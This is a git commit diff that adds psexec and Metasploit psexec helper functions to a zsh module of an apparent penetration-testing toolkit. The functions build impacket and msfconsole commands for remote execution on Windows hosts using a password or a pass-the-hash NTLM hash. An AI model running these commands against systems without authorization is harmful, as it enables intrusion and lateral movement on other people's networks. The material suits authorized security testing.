68377a42692c611a4e9fa7a0d5578b10f81505fa
Twilight4 <electrolight071@proton.me>
2024-05-15 12:02:53 +0200

    update

--- modules/nb-os.zsh
+++ modules/nb-os.zsh
@@ -14,6 +14,9 @@ Commands
 --------
 nb-os-rdp                  connect via rdp to a target host
 nb-os-evil-winrm           connect via winrm to a target host
+nb-os-psexec               connect via psexec to a target host
+nb-os-psexec-msf           connect via metasploit's psexec to a target host
+
 nb-os-pkg-query            query if a package is installed or not  
 nb-os-flush-iptables       flushes ip tables
 nb-os-get-gateway          get router IP address
@@ -36,9 +39,78 @@ nb-os-sudoers-harden       removes sudo exclusions
 DOC
 }
 
+nb-os-psexec() {
+  nb-vars-set-rhost
+  nb-vars-set-user
+  echo
+
+  __ask "Do you want to log in using a password or a hash? (p/h)"
+  local login && __askvar login "LOGIN_OPTION"
+
+  if [[ $login == "p" ]]; then
+      __ask "Do you want to add a domain? (y/n)"
+      local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"
+
+      if [[ $add_domain == "y" ]]; then
+          __ask "Enter the domain"
+          nb-vars-set-domain
+          __ask "Enter a password for authentication"
+          nb-vars-set-pass
+          print -z "psexec.py ${__DOMAIN}/${__USER}:'${__PASS}'@${__RHOST}"
+      else
+          __ask "Enter a password for authentication"
+          nb-vars-set-pass
+          print -z "psexec.py ${__USER}:'${__PASS}'@${__RHOST}"
+      fi
+  elif [[ $login == "h" ]]; then
+      echo
+      __ask "Enter the NTLM hash for authentication"
+      __check-hash
+      print -z "psexec.py ${__USER}@${__RHOST} -hashes :${__HASH}"
+  else
+      echo
+      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+  fi
+}
+
+nb-os-psexec-msf() {
+  nb-vars-set-rhost
+  nb-vars-set-user
+  echo
+
+  __ask "Do you want to log in using a password or a hash? (p/h)"
+  local login && __askvar login "LOGIN_OPTION"
+
+  if [[ $login == "p" ]]; then
+      __ask "Do you want to add a domain? (y/n)"
+      local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"
+
+      if [[ $add_domain == "y" ]]; then
+          __ask "Enter the domain"
+          nb-vars-set-domain
+          __ask "Enter a password for authentication"
+          nb-vars-set-pass
+          print -z "msfconsole -q -x \"use exploit/windows/smb/psexec ; set rhosts ${__RHOST} ; set smbdomain ${__DOMAIN} ; set smbuser ${__USER} ; set smbpass ${__PASS} ; run\""
+      else
+          __ask "Enter a password for authentication"
+          nb-vars-set-pass
+          print -z "msfconsole -q -x \"use exploit/windows/smb/psexec ; set rhosts ${__RHOST} ; set smbuser ${__USER} ; set smbpass ${__PASS} ; run\""
+      fi
+  elif [[ $login == "h" ]]; then
+      echo
+      __ask "Enter the NTLM hash for authentication"
+      __check-hash
+      print -z "msfconsole -q -x \"use exploit/windows/smb/psexec ; set rhosts ${__RHOST} ; set smbuser ${__USER} ; set smbpass ${__HASH} ; run\""
+  else
+      echo
+      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+  fi
+}
+
 nb-os-rdp() {
   nb-vars-set-rhost
   nb-vars-set-user
+  echo
 
     __ask "Do you want to log in using a password or a hash? (p/h)"
     local login && __askvar login "LOGIN_OPTION"
